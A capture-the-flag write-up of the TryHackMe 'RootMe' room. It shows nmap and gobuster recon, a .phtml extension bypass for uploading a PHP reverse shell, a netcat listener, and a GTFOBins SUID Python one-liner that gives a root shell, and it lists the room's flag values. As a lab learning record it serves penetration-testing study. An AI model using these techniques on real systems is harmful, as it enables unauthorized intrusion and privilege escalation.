# RootMe — TryHackMe

**Date:** May 2026  
**Difficulty:** Easy  
**Category:** Web, Privilege Escalation  
**Status:** ✅ Completed  

---

# 🔍 Summary

RootMe is a beginner-friendly TryHackMe room that focuses on web exploitation and Linux privilege escalation.  
The objective was to gain initial access through a vulnerable file upload feature and escalate privileges to root using SUID misconfigurations.

---

# 🛠️ Tools Used

- Nmap
- Gobuster
- Netcat
- PHP Reverse Shell
- GTFOBins

---

# 📡 Reconnaissance

## Nmap Scan

```bash
nmap -sS -A -T4 MACHINE_IP
```

<img width="1299" height="1241" alt="Screenshot 2026-05-24 020546" src="https://github.com/user-attachments/assets/61998abc-8aef-4bde-a18f-ed21d01dc608" />


### Findings

The scan revealed:
- Port 22 running SSH
- Port 80 running Apache HTTP Server

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |

---

## Gobuster Enumeration

```bash
gobuster dir -u http://MACHINE_IP/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-t 100
```

<img width="935" height="420" alt="Screenshot 2026-05-24 180708" src="https://github.com/user-attachments/assets/851f39a4-e879-4912-b765-eff519a1ca55" />


### Directories Found

- `/uploads`
- `/panel`
- `/css`
- `/js`

The `/panel` directory appeared to contain a file upload form.

---

# 🔓 Exploitation

## File Upload Vulnerability

Navigating to `/panel/` revealed a file upload page.

<img width="2559" height="1325" alt="Screenshot 2026-05-24 180750" src="https://github.com/user-attachments/assets/a0321df8-66ae-4e0a-9641-e961c5de31fe" />


I downloaded the PHP reverse shell from:

```text
https://github.com/pentestmonkey/php-reverse-shell
```

<img width="2559" height="1159" alt="Screenshot 2026-05-24 181004" src="https://github.com/user-attachments/assets/7bc64c0c-06df-4096-8ed6-354109cba0d4" />


Initially, uploading a `.php` file was blocked.

<img width="2559" height="1329" alt="Screenshot 2026-05-24 181057" src="https://github.com/user-attachments/assets/8dfde2ee-315d-4965-bb1c-5e6a9ee5c05b" />


To bypass the restriction, I renamed the payload from:

```text
php-reverse-shell.php
```

to:

```text
php-reverse-shell.phtml
```

<img width="2559" height="1326" alt="Screenshot 2026-05-24 181354" src="https://github.com/user-attachments/assets/1e12398f-595e-4a90-a479-239aba14f73d" />


The upload succeeded successfully after changing the extension.

<img width="2559" height="1263" alt="Screenshot 2026-05-24 181638" src="https://github.com/user-attachments/assets/edafc456-968f-455e-a733-ce8bdcfbe1ef" />


---

## Reverse Shell

I started a Netcat listener:

```bash
nc -lvnp 1234
```

Then accessed the uploaded reverse shell through the browser.

A reverse shell connection was established.


### User Flag

I searched for the user flag:

```bash
find / -type f -name "user.txt" 2>/dev/null
```

Reading the flag:

```bash
cat /var/www/user.txt
```

Output:

```text
THM{you_g0t_a_sh3ll}
```
<img width="1057" height="281" alt="Screenshot 2026-05-24 184457" src="https://github.com/user-attachments/assets/885dcac6-c685-47ba-be50-6d8f639ad5f5" />

---

# ⬆️ Privilege Escalation

## SUID Enumeration

I searched for SUID binaries:

```bash
find / -type f -perm -4000 2>/dev/null
```

<img width="548" height="1010" alt="Screenshot 2026-05-24 185308" src="https://github.com/user-attachments/assets/91869ce9-7ea4-4bec-818e-cd6fca24ffb6" />


A vulnerable binary was discovered:

```text
/usr/bin/python2.7
```

---

## GTFOBins Exploitation

Using GTFOBins, I found a privilege escalation technique for Python SUID binaries.

<img width="2559" height="1323" alt="Screenshot 2026-05-24 185603" src="https://github.com/user-attachments/assets/376d6a0a-6da1-4548-bb69-e593d67ec0b9" />


Executed:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

This spawned a root shell.

### Root Flag

Reading the root flag:

```bash
cat /root/root.txt
```

Output:

```text
THM{pr1v1l3g3_3sc4l4t10n}
```
<img width="615" height="597" alt="Screenshot 2026-05-24 190656" src="https://github.com/user-attachments/assets/288c9e49-1c63-417c-85e1-7d73b5f46417" />

---

# 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| User Flag | /var/www/user.txt | `THM{you_g0t_a_sh3ll}` |
| Root Flag | /root/root.txt | `THM{pr1v1l3g3_3sc4l4t10n}` |

---

<img width="1656" height="977" alt="Screenshot 2026-05-24 185750" src="https://github.com/user-attachments/assets/b22b5957-9b67-489f-9618-a8fdcf5f2ab7" />

# 📚 Lessons Learned

- Practiced web directory enumeration
- Learned how to exploit insecure file upload functionality
- Used reverse shells for remote command execution
- Learned extension bypass techniques using `.phtml`
- Practiced Linux privilege escalation through SUID binaries
- Used GTFOBins for privilege escalation research

---

# 📁 Recommended Repository Structure

```text
RootMe/
│
├── README.md
└── images/
    ├── nmap.png
    ├── gobuster.png
    ├── upload-panel.png
    ├── php-reverse-shell.png
    ├── php-blocked.png
    ├── rename-payload.png
    ├── upload-success.png
    ├── reverse-shell.png
    ├── suid.png
    ├── gtfobins.png
    └── completed.png
```
